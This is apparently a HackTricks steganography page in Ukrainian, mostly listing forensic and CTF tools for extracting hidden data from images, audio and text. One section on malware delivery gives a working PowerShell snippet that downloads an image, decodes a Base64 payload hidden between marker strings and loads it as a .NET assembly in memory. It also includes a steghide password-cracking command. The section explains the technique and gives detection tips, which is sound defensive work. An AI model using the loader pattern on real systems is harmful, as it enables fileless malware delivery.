# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Extracting Data from Files**

### **Binwalk**

Інструмент для пошуку в бінарних файлах вкладених прихованих файлів та даних. Встановлюється через `apt`, а його вихідний код доступний на [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Відновлює файли на основі їхніх заголовків і кінцевих частин, корисна для png-зображень. Встановлюється через `apt` з його вихідним кодом на [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Допомагає переглядати метадані файлу. Доступний [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Схожий на exiftool, для перегляду метаданих. Можна встановити через `apt`, вихідний код на [GitHub](https://github.com/Exiv2/exiv2), і має [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **Файл**

Визначте тип файлу, з яким ви маєте справу.

### **Рядки**

Видобуває читабельні рядки з файлів, використовуючи різні налаштування кодування для фільтрації виводу.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Порівняння (cmp)**

Корисно для порівняння зміненого файлу з його оригінальною версією, знайденою онлайн.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Витягування прихованих даних у тексті**

### **Приховані дані в пробілах**

Невидимі символи у, здавалося б, порожніх пробілах можуть приховувати інформацію. Щоб витягти ці дані, відвідайте [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Витягування даних зі зображень**

### **Визначення деталей зображення за допомогою GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) використовується для визначення типів файлів зображень і виявлення можливих пошкоджень. Виконайте наведену нижче команду, щоб перевірити зображення:
```bash
./magick identify -verbose stego.jpg
```
Щоб спробувати відновити пошкоджене зображення, додавання метаданого коментаря може допомогти:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide для приховування даних**

Steghide дозволяє ховати дані в файлах `JPEG, BMP, WAV, and AU`, може вбудовувати та витягувати зашифровані дані. Встановлення просте через `apt`, а його [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Команди:**

- `steghide info file` показує, чи містить файл приховані дані.
- `steghide extract -sf file [--passphrase password]` витягує приховані дані, пароль необов'язковий.

Для веб-екстракції відвідайте [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Щоб спробувати password cracking для Steghide, використайте [stegcracker](https://github.com/Paradoxis/StegCracker.git) наступним чином:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg для PNG і BMP файлів**

zsteg спеціалізується на виявленні прихованих даних у PNG та BMP файлах. Встановлення виконується через `gem install zsteg`, with its [source on GitHub](https://github.com/zed-0xff/zsteg).

**Команди:**

- `zsteg -a file` застосовує всі методи виявлення до файлу.
- `zsteg -E file` вказує payload для витягання даних.

### **StegoVeritas та Stegsolve**

**stegoVeritas** перевіряє метадані, виконує трансформації зображення та застосовує LSB brute forcing серед інших можливостей. Використовуйте `stegoveritas.py -h` для повного списку опцій і `stegoveritas.py stego.jpg` щоб виконати всі перевірки.

**Stegsolve** застосовує різні колірні фільтри для виявлення прихованих текстів або повідомлень у зображеннях. Доступний на [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT для виявлення прихованого вмісту**

Fast Fourier Transform (FFT) техніки можуть виявляти прихований вміст на зображеннях. Корисні ресурси включають:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy для аудіо та зображень**

Stegpy дозволяє вбудовувати інформацію в зображення та аудіофайли, підтримуючи формати PNG, BMP, GIF, WebP та WAV. Доступний на [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck для аналізу PNG-файлів**

Щоб аналізувати PNG-файли або перевірити їх достовірність, використовуйте:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Додаткові інструменти для аналізу зображень**

For further exploration, consider visiting:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Маркерно-розмежовані Base64 payloads, приховані в зображеннях (malware delivery)

Commodity loaders дедалі частіше ховають Base64-encoded payloads як plain text всередині інакше валідних зображень (часто GIF/PNG). Замість pixel-level LSB, payload розмежовується унікальними start/end marker strings, вбудованими в текст/metadata файлу. Далі PowerShell stager:

- Завантажує зображення через HTTP(S)
- Знаходить marker strings (приклади помічені: <<sudo_png>> … <<sudo_odt>>)
- Витягує текст між ними і Base64-декодує його в байти
- Завантажує .NET assembly в пам'ять і викликає відомий entry method (файл на диск не записується)

Мінімальний PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Примітки
- Це підпадає під ATT&CK T1027.003 (steganography). Маркери рядків відрізняються між кампаніями.
- Пошук: скануйте завантажені зображення на наявність відомих роздільників; помічайте `PowerShell`, який використовує `DownloadString`, а потім `FromBase64String`.

Див. також приклади доставки через phishing та повний потік викликів у пам'яті тут:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Витяг даних з аудіо**

**Audio steganography** пропонує унікальний метод приховування інформації в аудіофайлах. Для вставки або вилучення прихованого вмісту використовуються різні інструменти.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide — універсальний інструмент для приховування даних у файлах JPEG, BMP, WAV та AU. Детальні інструкції наведені в [документації stego tricks](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Цей інструмент сумісний з різними форматами, включаючи PNG, BMP, GIF, WebP та WAV. Для додаткової інформації див. [розділ Stegpy](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg важливий для перевірки цілісності аудіофайлів, виведення детальної інформації та виявлення будь-яких невідповідностей.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg відмінно підходить для приховування та витягнення даних у WAV-файлах, використовуючи метод найменш значущого біта. Доступно на [GitHub](https://github.com/ragibson/Steganography#WavSteg). Команди включають:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound дозволяє шифрувати та виявляти інформацію в аудіофайлах за допомогою AES-256. Його можна завантажити з [офіційної сторінки](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Незамінний інструмент для візуального та аналітичного огляду аудіофайлів, Sonic Visualizer може виявляти приховані елементи, недоступні іншими методами. Для додаткової інформації відвідайте [офіційний вебсайт](https://www.sonicvisualiser.org/).

### **DTMF Tones - Dial Tones**

Виявлення DTMF-тонів в аудіофайлах можна здійснити за допомогою онлайн-інструментів, таких як [цей DTMF-детектор](https://unframework.github.io/dtmf-detect/) та [DialABC](http://dialabc.com/sound/detect/index.html).

## **Інші техніки**

### **Binary Length SQRT - QR Code**

Бінарні дані, довжина яких є квадратом цілого числа, можуть представляти QR-код. Використайте цей фрагмент, щоб перевірити:
```python
import math
math.sqrt(2500) #50
```
Для перетворення бінарних даних у зображення перегляньте [dcode](https://www.dcode.fr/binary-image). Щоб прочитати QR-коди, використайте [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Переклад Брайля**

Для перекладу Брайля [Branah Braille Translator](https://www.branah.com/braille-translator) — відмінний ресурс.

## **Посилання**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
